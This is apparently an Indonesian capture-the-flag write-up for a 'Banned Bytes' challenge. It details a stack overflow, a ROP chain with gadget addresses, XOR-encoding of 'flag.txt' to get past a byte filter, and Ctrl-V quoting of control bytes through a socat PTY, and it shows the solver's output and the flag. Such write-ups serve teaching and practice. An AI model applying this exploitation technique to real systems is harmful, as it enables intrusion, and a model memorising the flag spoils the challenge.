# Banned Bytes

`vuln` punya stack overflow langsung:

- `read(0, buf, 0x200)` nulis ke buffer stack ukuran `0x50`
- No canary, no PIE, NX aktif
- Setelah baca input, program nol-in setiap byte `x`, `g`, `a`, dan `.`

Targetnya bukan shell. Binary sudah import `print_file()` dari `libprint.so`, jadi cukup panggil itu dengan argumen `flag.txt`.

Masalahnya string `flag.txt` sendiri kena filter. Solusinya:

1. Tulis string ter-encode `dnce,vzv` ke `.bss`
2. XOR tiap byte dengan `0x02` pakai gadget yang sudah disediakan binary
3. `pop rdi; ret`
4. Panggil `print_file@plt`

Offset RIP ada di `0x50 + 8 = 88`.

ROP yang dipakai:

```text
0x40125b  pop r12; pop r13; pop r14; pop r15; ret
0x401269  mov qword ptr [r13], r12; ret
0x401264  pop r14; pop r15; ret
0x40126e  xor byte ptr [r15], r14b; ret
0x401272  pop rdi; ret
0x401060  print_file@plt
```

Alamat tulis yang aman: `0x404068`. Saya sengaja hindari `0x404060` karena byte alamat `0x67` pada salah satu offset bakal kena filter.

Twist utamanya ada di service wrapper. Target jalan lewat `socat ...,pty`, jadi beberapa byte kontrol di payload tidak sampai utuh ke program. Byte `0x12` dari alamat gadget `0x4012xx` diperlakukan sebagai `Ctrl-R` oleh line discipline PTY dan malah me-reprint input. Bypass-nya adalah quote byte kontrol dengan `0x16` (`Ctrl-V`) sebelum dikirim. Terminal akan mengonsumsi `0x16` dan meneruskan byte berikutnya secara literal ke `read()`.

Contoh output:

```text
$ python3 solve.py
[+] Opening connection to 13.127.119.28 on port 1338: Done
You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
TBCTF{r0p_byp4551ng_ch4r5_4r3_s0_3z}
```

Jalankan:

```bash
source /home/nata/ctf_env/bin/activate
python3 solve.py
```
